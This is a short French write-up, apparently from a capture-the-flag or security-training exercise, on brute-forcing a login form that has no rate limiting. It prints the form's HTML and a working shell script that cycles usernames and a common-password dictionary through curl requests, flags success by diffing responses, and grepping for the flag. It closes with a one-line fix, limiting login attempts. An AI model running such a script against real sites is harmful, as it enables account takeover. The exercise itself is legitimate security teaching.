# Explications
Dans la page "signin", il y un formulaire de connexion :

```html
<form action="#" method="GET"> 
	<input type="hidden" name="page" value="signin">
	Username:<input type="text" name ="username" style="width:100%;">
	Password:<input type="password" name ="password" style="width:100%;" AUTOCOMPLETE="off">
	<input type="submit" value="Login" name ="Login">
</form>
```
On observe après plusieurs essais de connexion que le site ne nous **bloque** pas et ne nous empeche pas de ressayer de se connecter.

Donc on essaye de se connecter en **Brute Force** avec un script shell :
```bash
#!/bin/sh
curl -s "http://$1/?page=signin&username=qsdqsd&password=qsd&Login=Login#" > trueone
while IFS='' read -r user; do
	echo "try user : $user"
	url1="http://$1/?page=signin&username="
	url2="&password="
	url3="&Login=Login#"
	while IFS='' read -r line; do
			echo "\ttry password: $line"
			curl -s "$url1$user$url2$line$url3" > tested
			DIFF=$(diff trueone tested)
			if [ "$DIFF" != "" ]
			then
					cat tested | grep "flag"
					echo "user is : $user\npassword is $line" >> result.txt
					rm tested
					break
			fi
			rm tested
	done < "dict.txt"
done < "users.txt"
```
Avec ce **Brute Force**, on utilise un [dictionnaire](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt) de mot de passe, et un liste d'**users**.

# Comment l'éviter ?
Il faut bloquer les **Brute Force**, en limitant le nombre d'essais de connexion sur une page.

# Bonus
On se rend compte apres plusieurs essais d'users avec le **Brute Force** que l'user n'est même pas necessaire pour obtenir le flag sur cette page.